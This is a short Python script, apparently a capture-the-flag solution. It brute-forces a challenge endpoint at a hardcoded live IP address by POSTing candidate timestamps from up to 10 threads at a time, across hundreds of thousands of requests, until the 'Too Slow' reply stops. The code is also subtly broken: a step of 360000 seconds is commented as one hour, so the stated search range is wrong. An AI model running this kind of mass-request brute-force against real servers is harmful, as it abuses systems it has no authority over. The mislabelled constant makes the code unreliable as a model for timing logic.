import requests
from datetime import datetime, timedelta
import threading

# The base URL of the challenge
url = 'http://20.244.82.82:2913/legend'
provided_timestamp = 1582510775.828625

# Convert the provided timestamp to a datetime object
provided_datetime = datetime.utcfromtimestamp(provided_timestamp)

# Define the time range for exploring future dates (e.g., 100 years into the future)
years_into_future = 100
hours_per_year = 365.25 * 24  # Average, accounting for leap years
time_range = int(years_into_future * hours_per_year)
time_step = 360000  # One hour in seconds

# Shared variable and lock for signaling success
success_flag = False
lock = threading.Lock()

def attempt_slay(datetime_obj):
    global success_flag
    # Check success flag before making a request
    with lock:
        if success_flag:
            return  # Stop this attempt if success has been flagged
    
    timestamp_str = str(datetime_obj.timestamp())
    data = {'slay': timestamp_str}
    response = requests.post(url, data=data)
    print(f"Attempted with timestamp {timestamp_str}: {response.text}")
    # Check response
    if "Too Slow. Try Again!" not in response.text:
        with lock:
            if not success_flag:  # Ensure the flag hasn't been set by another thread
                success_flag = True  # Set the flag to stop other threads
                print(f"Success with timestamp {timestamp_str}: {response.text}")

def worker(offset):
    # Calculate the new datetime for this iteration, adding time for future exploration
    new_datetime = provided_datetime + timedelta(seconds=offset * time_step)
    attempt_slay(new_datetime)

threads = []

for offset in range(0, time_range + 1):
    with lock:
        if success_flag:
            break  # Stop starting new threads if success has been found
    
    t = threading.Thread(target=worker, args=(offset,))
    threads.append(t)
    t.start()

    # Limit to 10 concurrent threads
    if len(threads) >= 10:
        for t in threads:
            t.join()  # Wait for these threads to finish
        threads = []  # Clear the list for the next batch

# Wait for any remaining threads to finish
for t in threads:
    t.join()
